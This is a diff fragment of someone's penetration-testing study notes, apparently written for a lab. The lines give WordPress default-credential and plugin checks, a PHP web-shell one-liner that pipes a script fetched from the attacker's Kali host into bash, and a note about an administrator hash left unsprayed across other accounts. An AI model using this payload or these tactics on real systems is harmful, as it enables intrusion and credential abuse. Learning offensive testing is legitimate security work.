@@ -78,6 +78,8 @@ that may have creds.
 - if you encounter wordpress website, and admin:admin not working, then the first thing is to check plugins and themese vulnerability using curl command
 - "<?php system('curl kali-ip/shell.sh | bash'); ?>". this downloads from kali/shell.sh and | pipe means execute in the memory. so meaning download+Execute
 -e.g you did ffuf on http://192.168.1.5/ and found there is http:192.168.1.5/old. when you open the old, there is plain website. but also check the website source code with curl
+-------------
+- i did escalate my privielge on ms01, and also obtained administrator hash, but didnot spray the hash on other user account such as c.rogers
 
 
 
